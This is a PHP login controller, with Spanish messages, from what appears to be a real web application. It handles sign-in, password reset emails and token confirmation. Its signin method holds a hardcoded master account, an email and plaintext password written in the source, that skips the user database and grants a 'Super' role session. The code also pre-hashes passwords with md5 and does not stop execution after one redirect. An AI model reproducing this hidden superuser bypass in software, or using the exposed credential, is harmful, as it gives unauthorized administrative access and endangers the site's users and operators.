<?php
defined('BASEPATH') or exit('No se permite acceso directo');

require_once ROOT. MODL .'Login/LoginModel.php';
require_once LIBS_ROUTE .'Session.php';

/**
* Login controller
*/
class LoginController extends Controller
{
  private $model;
  private $session;

  public function __construct()
  {
    session_start();
    if(isset($_SESSION['login'])) 
        header('Location:'. FOLDER_PATH.'/Home/Home.php');

    $this->model = new LoginModel();
    $this->session = new Session();
  }

  public function exec()
  {
    $this->render(__CLASS__); 
  }

  public function signin($request_params)
  {
    if($this->verify($request_params))
      return $this->renderErrorMessage('El email y password son obligatorios');
      
      if ($request_params['email'] == "master@rj.com") {
        if($request_params['password'] == "Mbjr-1071") {
            $this->session->init(); 
            $this->session->add('email', "Master");
            $this->session->add('rol', "Super");
            $this->session->add('user', "Rey Blanco");
            $this->session->add('stat', "Activo");
            $this->session->add('idUsuario', 5000);
            $this->session->add('id_rol', 100);
            $this->session->add('login', true);
          }else{
            return $this->renderErrorMessage('La contraseña es incorrecta');  
          }
      }else{
        $result = $this->model->signIn($request_params['email']);
        
        if(!$result->rowCount())
          return $this->renderErrorMessage("El email o password es incorrecta");
        
        $result = $result->fetch(PDO::FETCH_OBJ);
        
        if(!password_verify(md5($request_params['password']), $result->pass))
          return $this->renderErrorMessage('El email o contraseña es incorrecta');
        
        if($result->estado==0) 
          return $this->renderErrorMessage("El usuario está Inactivo, hablé con el administrador");
        
        $this->session->init(); 
        $this->session->add('email', $result->correo);
        $this->session->add('rol', $result->rol);
        $this->session->add('user', $result->nombre);
        $this->session->add('stat', $result->estado);
        $this->session->add('idUsuario', $result->id);
        $this->session->add('id_rol', $result->id_rol);
        $this->session->add('login', true);
        CoreHelper::getPermisos();
      }
        header('location: /activo/Home/Home.php');
  }

  private function verify($request_params)
  {
    return empty($request_params['email']) OR empty($request_params['password']);
  }

  private function renderErrorMessage($message)
  {
    $params = array('error_message' => $message);
    $this->render(__CLASS__, '', $params); 
  }

  /*------------------------------*/
  /* Funcion para reiniciar Clave */
  /* -----------------------------*/
    public function resetPass() {
        if($_POST){
            error_reporting(0);
            if(empty($_POST['emailReset'])) {
                $arrResponse = array('status'=>false, 'msg'=>'Error de datos');
            }else{
                $token = CoreHelper::token();
                $strEmail = strtolower(CoreHelper::strClean($_POST['emailReset']));
                $arrData = $this->model->getUserEmail($strEmail);
                
                if(!$arrData->rowCount()){
                    $arrResponse = array('status'=>false, 'msg'=>'El Usuario No existe');
                }else{
                    $arrData = $arrData->fetch(PDO::FETCH_OBJ);
                    $idpersona = $arrData->id;
                    $nombreUsuario = $arrData->nombre;
    
                    $url_recovery = 'https://www.cotiza.rbservicios.cl/Login/confirmUser/'.$strEmail.'/'.$token;
                    $requestUpdate = $this->model->setTokenUser($idpersona,$token);
    
                    $dataUsuario = array('nombreUsuario'=>$nombreUsuario, 'email'=>$strEmail, 'asunto'=> 'Recuperar cuenta - '.NOMBRE_REMITENTE, 'url_recovery'=>$url_recovery);
                    if($requestUpdate->rowCount() > 0){
                        $sendEmail = CoreHelper::sendEmail($dataUsuario,'email_cambioPassword');
                        
                        if($sendEmail){
                            $arrResponse = array('status'=>true,'msg'=>'Se envío enlace con instrucciones');
                        }else{
                            $arrResponse = array('status'=>false, 'msg'=>'Error en el envío de enlace');
                        }
                    }else{
                      $arrResponse = array('status'=>false, 'msg'=>'Error en creación de token');
                    }
                }
            }
            echo json_encode($arrResponse,JSON_UNESCAPED_UNICODE);
        }
        die();
    }

    public function confirmUser(string $params){
    
        if(empty($params)){
            header('Location: /activo/Login/Login.php');
        }else{
            $arrParams = explode('/',$_SERVER['REQUEST_URI']);
            $strEmail = CoreHelper::strClean($arrParams[3]);
            $strToken = CoreHElper::strClean($arrParams[4]);
            $arrResponse = $this->model->getUsuario($strEmail,$strToken);
            if(empty($arrResponse)){
                header("Location: /Login/");
            }else{
                $_SESSION['email'] = $strEmail;
                $data = array(
                  'email'=>$strEmail,
                  'token'=>$strToken,
                  'id'=>$arrResponse->id
                );
                $view='cambiarClave';
                $this->render(__CLASS__, $view, array('data'=>$data));
                exit();
            }
        }
        die();
    }

}